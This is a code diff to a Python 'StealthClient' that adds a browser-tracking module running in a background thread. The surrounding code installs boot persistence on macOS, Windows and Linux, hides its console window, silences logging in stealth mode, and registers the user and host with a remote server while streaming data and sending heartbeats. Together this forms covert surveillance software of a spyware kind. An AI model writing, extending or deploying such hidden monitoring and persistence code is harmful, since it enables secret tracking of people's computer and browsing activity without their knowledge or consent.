@@ -16,6 +16,7 @@ sys.path.append('src')
 from src.core.config import Config
 from src.utils.api_client import APIClient
 from src.modules.stream_handler import StreamHandler
+from src.modules.browser_tracker import BrowserTracker
 
 # Global flag for graceful shutdown
 shutdown_flag = False
@@ -58,12 +59,12 @@ def install_autostart():
     """Install client to start automatically on system boot"""
     try:
         current_file = os.path.abspath(__file__)
-        
+
         if platform.system() == "Darwin":  # macOS
             # Create LaunchAgent plist
             plist_dir = os.path.expanduser("~/Library/LaunchAgents")
             os.makedirs(plist_dir, exist_ok=True)
-            
+
             plist_file = os.path.join(plist_dir, "com.tenjo.client.plist")
             plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -86,14 +87,14 @@ def install_autostart():
     <string>/dev/null</string>
 </dict>
 </plist>"""
-            
+
             with open(plist_file, 'w') as f:
                 f.write(plist_content)
-            
+
             # Load the service
             subprocess.run(['launchctl', 'load', plist_file], capture_output=True)
             return True
-            
+
         elif platform.system() == "Windows":  # Windows
             # Add to Windows startup registry
             import winreg
@@ -101,12 +102,12 @@ def install_autostart():
             winreg.SetValueEx(key, "TenjoClient", 0, winreg.REG_SZ, f'python "{current_file}"')
             winreg.CloseKey(key)
             return True
-            
+
         elif platform.system() == "Linux":  # Linux
             # Create systemd user service
             service_dir = os.path.expanduser("~/.config/systemd/user")
             os.makedirs(service_dir, exist_ok=True)
-            
+
             service_file = os.path.join(service_dir, "tenjo-client.service")
             service_content = f"""[Unit]
 Description=Tenjo Client
@@ -120,15 +121,15 @@ RestartSec=10
 
 [Install]
 WantedBy=default.target"""
-            
+
             with open(service_file, 'w') as f:
                 f.write(service_content)
-            
+
             # Enable and start service
             subprocess.run(['systemctl', '--user', 'enable', 'tenjo-client.service'], capture_output=True)
             subprocess.run(['systemctl', '--user', 'start', 'tenjo-client.service'], capture_output=True)
             return True
-            
+
     except Exception as e:
         logging.error(f"Failed to install autostart: {e}")
         return False
@@ -137,11 +138,14 @@ class StealthClient:
     def __init__(self):
         self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
         self.stream_handler = StreamHandler(self.api_client)
-        
+
         # Setup stealth logging
         setup_stealth_logging()
         self.logger = logging.getLogger('StealthClient')
-        
+
+        # Initialize browser tracker
+        self.browser_tracker = BrowserTracker(self.api_client, self.logger)
+
         # Hide console in stealth mode
         if Config.STEALTH_MODE:
             hide_console_window()
@@ -159,7 +163,7 @@ class StealthClient:
                 'username': Config.CLIENT_USER,
                 'os_info': f"{Config.PLATFORM} {Config.HOSTNAME}"
             }
-            
+
             response = self.api_client.post('/api/clients/register', client_info)
             return True
         except Exception as e:
@@ -176,7 +180,7 @@ class StealthClient:
                 'timestamp': time.time(),
                 'status': 'active'
             }
-            
+
             response = self.api_client.post('/api/clients/heartbeat', heartbeat_data)
             return True
         except Exception as e:
@@ -186,20 +190,20 @@ class StealthClient:
     def run(self):
         """Main execution loop - STEALTH MODE"""
         global shutdown_flag
-        
+
         if not Config.STEALTH_MODE:
             self.logger.info("=== STEALTH TENJO CLIENT STARTING ===")
-        
+
         # Install autostart on first run
         if not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
             if install_autostart():
                 # Mark as installed
                 with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
                     f.write(str(time.time()))
-        
+
         # Register with server (optional)
         self.register_client()
-        
+
         # Start stream handler in separate thread
         stream_thread = None
         try:
@@ -212,23 +216,33 @@ class StealthClient:
         except Exception as e:
             if not Config.STEALTH_MODE:
                 self.logger.error(f"Failed to start stream handler: {e}")
-        
+
+        # Start browser tracker in separate thread
+        browser_thread = None
+        try:
+            self.browser_tracker.start_tracking()
+            if not Config.STEALTH_MODE:
+                self.logger.info("Browser tracker started")
+        except Exception as e:
+            if not Config.STEALTH_MODE:
+                self.logger.error(f"Failed to start browser tracker: {e}")
+
         # Stealth main loop - minimal logging
         heartbeat_counter = 0
         while not shutdown_flag:
             try:
                 heartbeat_counter += 1
-                
+
                 # Send heartbeat every 5 minutes (300 seconds / 5 = 60 cycles)
                 if heartbeat_counter % 60 == 0:
                     self.send_heartbeat()
-                
+
                 # Log status only in debug mode
                 if heartbeat_counter % 720 == 0 and not Config.STEALTH_MODE:  # Every hour
                     self.logger.info(f"Stealth client running - {heartbeat_counter} cycles completed")
-                
+
                 time.sleep(5)  # 5 second intervals
-                
+
             except KeyboardInterrupt:
                 if not Config.STEALTH_MODE:
                     self.logger.info("Received keyboard interrupt")
@@ -237,7 +251,7 @@ class StealthClient:
                 if not Config.STEALTH_MODE:
                     self.logger.error(f"Main loop error: {e}")
                 time.sleep(10)
-        
+
         if not Config.STEALTH_MODE:
             self.logger.info("Stealth client shutting down...")
 
@@ -246,7 +260,7 @@ def main():
     # Set up signal handlers
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
-    
+
     # Create and run stealth client
     client = StealthClient()
     client.run()
